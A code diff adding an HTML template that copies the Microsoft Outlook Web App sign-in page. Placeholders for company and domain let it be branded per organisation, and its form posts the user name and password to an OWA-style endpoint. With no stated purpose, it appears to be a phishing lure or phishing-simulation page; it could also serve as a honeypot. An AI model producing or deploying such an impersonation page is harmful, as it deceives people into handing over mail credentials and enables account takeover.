@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Outlook Web App</title>
+  <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAAAA=" type="image/x-icon">
+  <style>
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0; padding: 0; height: 100%;
+      font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe", Tahoma, Helvetica, Arial, sans-serif;
+      color: #333;
+      background: #0072c6;
+    }
+    .stage {
+      min-height: 100%;
+      display: flex; align-items: center; justify-content: center;
+      padding: 24px;
+    }
+    .card {
+      width: 440px; max-width: 100%;
+      background: #fff;
+      box-shadow: 0 2px 12px rgba(0,0,0,.18);
+      padding: 36px 40px 28px;
+    }
+    .brand {
+      font-size: 14px; color: #666; letter-spacing: .02em;
+      margin-bottom: 6px;
+    }
+    h1 {
+      margin: 0 0 22px;
+      font-weight: 300;
+      font-size: 28px;
+      color: #1a1a1a;
+    }
+    label {
+      display: block;
+      font-size: 13px; color: #666;
+      margin: 14px 0 4px;
+    }
+    input[type=text], input[type=password] {
+      width: 100%;
+      padding: 8px 10px;
+      border: 1px solid #c8c8c8;
+      font-size: 15px;
+      line-height: 22px;
+      outline: none;
+    }
+    input[type=text]:focus, input[type=password]:focus {
+      border-color: #0072c6;
+    }
+    .row-check {
+      margin: 16px 0 6px;
+      font-size: 13px;
+    }
+    .row-check label { display: inline; margin: 0; color: #333; }
+    button {
+      margin-top: 18px;
+      background: #0072c6;
+      color: #fff;
+      border: none;
+      padding: 9px 18px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    button:hover { background: #005a9e; }
+    .foot {
+      margin-top: 18px;
+      font-size: 12px;
+      color: #888;
+    }
+    .foot a { color: #0072c6; text-decoration: none; }
+    .ribbon {
+      background: #0072c6;
+      color: #fff;
+      padding: 8px 12px;
+      font-size: 13px;
+      margin: -36px -40px 24px;
+    }
+  </style>
+</head>
+<body>
+  <div class="stage">
+    <div class="card">
+      <div class="ribbon">Outlook Web App</div>
+      <div class="brand">{{ company }} &middot; {{ domain }}</div>
+      <h1>Sign in</h1>
+
+      <form method="POST" action="/owa/auth.owa" autocomplete="off">
+        <input type="hidden" name="destination" value="https://mail.{{ domain }}/owa/">
+        <input type="hidden" name="flags" value="4">
+        <input type="hidden" name="forcedownlevel" value="0">
+        <input type="hidden" name="trusted" value="0">
+        <input type="hidden" name="isUtf8" value="1">
+
+        <label for="username">User name</label>
+        <input id="username" name="username" type="text" autofocus
+               placeholder="domain\username or user@{{ domain }}">
+
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password">
+
+        <div class="row-check">
+          <input type="checkbox" id="rememberMe" name="rememberMe" value="1">
+          <label for="rememberMe">Keep me signed in</label>
+        </div>
+
+        <button type="submit">Sign in</button>
+      </form>
+
+      <div class="foot">
+        Connected to Microsoft Exchange<br>
+        &copy; {{ company }}. All rights reserved.
+      </div>
+    </div>
+  </div>
+</body>
+</html>
